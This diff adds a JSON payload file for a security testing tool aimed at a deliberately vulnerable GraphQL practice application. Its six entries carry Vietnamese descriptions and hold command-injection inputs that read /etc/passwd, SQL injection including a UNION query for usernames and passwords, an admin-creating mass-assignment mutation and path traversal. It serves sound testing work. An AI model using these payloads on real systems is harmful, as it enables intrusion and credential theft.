@@ -1,0 +1,97 @@
+{
+  "payloads": [
+    {
+      "query": "query { systemDebug(arg: \"id; echo DVGA_MARKER\") }",
+      "variables": {},
+      "operation_name": null,
+      "operation": "query",
+      "attack_type": "COMMAND_INJECTION",
+      "payload_value": "id; echo DVGA_MARKER",
+      "owasp_category": "A03:2021-Injection",
+      "context": "Khai thác lỗ hổng command injection thông qua tham số arg của field systemDebug.",
+      "expected_signal": [
+        "uid=",
+        "gid=",
+        "DVGA_MARKER"
+      ],
+      "target_app": "dvga"
+    },
+    {
+      "query": "query { systemDiagnostics(cmd: \"cat /etc/passwd; echo DVGA_MARKER\") }",
+      "variables": {},
+      "operation_name": null,
+      "operation": "query",
+      "attack_type": "COMMAND_INJECTION",
+      "payload_value": "cat /etc/passwd; echo DVGA_MARKER",
+      "owasp_category": "A03:2021-Injection",
+      "context": "Thực thi lệnh hệ thống độc hại đọc file nhạy cảm qua systemDiagnostics.",
+      "expected_signal": [
+        "root:x:",
+        "DVGA_MARKER"
+      ],
+      "target_app": "dvga"
+    },
+    {
+      "query": "query { paste(id: \"1' OR '1'='1\") { id title content } }",
+      "variables": {},
+      "operation_name": null,
+      "operation": "query",
+      "attack_type": "SQL_INJECTION",
+      "payload_value": "1' OR '1'='1",
+      "owasp_category": "A03:2021-Injection",
+      "context": "Khai thác SQL injection qua tham số id trong field paste để trích xuất dữ liệu.",
+      "expected_signal": [
+        "id",
+        "title",
+        "content"
+      ],
+      "target_app": "dvga"
+    },
+    {
+      "query": "query { search(query: \"' UNION SELECT null, username, password FROM users--\") { id title } }",
+      "variables": {},
+      "operation_name": null,
+      "operation": "query",
+      "attack_type": "SQL_INJECTION",
+      "payload_value": "' UNION SELECT null, username, password FROM users--",
+      "owasp_category": "A03:2021-Injection",
+      "context": "Sử dụng UNION-based SQL injection trên field search để lấy thông tin bảng users.",
+      "expected_signal": [
+        "username",
+        "password"
+      ],
+      "target_app": "dvga"
+    },
+    {
+      "query": "mutation { createUser(username: \"admin\", password: \"hacked\", role: \"admin\") { id username } }",
+      "variables": {},
+      "operation_name": null,
+      "operation": "mutation",
+      "attack_type": "MASS_ASSIGNMENT",
+      "payload_value": "admin",
+      "owasp_category": "A08:2021-Software and Data Integrity Failures",
+      "context": "Khai thác lỗ hổng mass assignment khi tạo tài khoản với quyền quản trị nâng cao.",
+      "expected_signal": [
+        "id",
+        "username",
+        "role"
+      ],
+      "target_app": "dvga"
+    },
+    {
+      "query": "query { paste(id: \"../etc/passwd\") { id content } }",
+      "variables": {},
+      "operation_name": null,
+      "operation": "query",
+      "attack_type": "PATH_TRAVERSAL",
+      "payload_value": "../etc/passwd",
+      "owasp_category": "A01:2021-Broken Access Control",
+      "context": "Thử nghiệm đường dẫn tuyệt đối/tương đối qua field paste để đọc file hệ thống.",
+      "expected_signal": [
+        "root:x:",
+        "bin:x:"
+      ],
+      "target_app": "dvga"
+    }
+  ]
+}
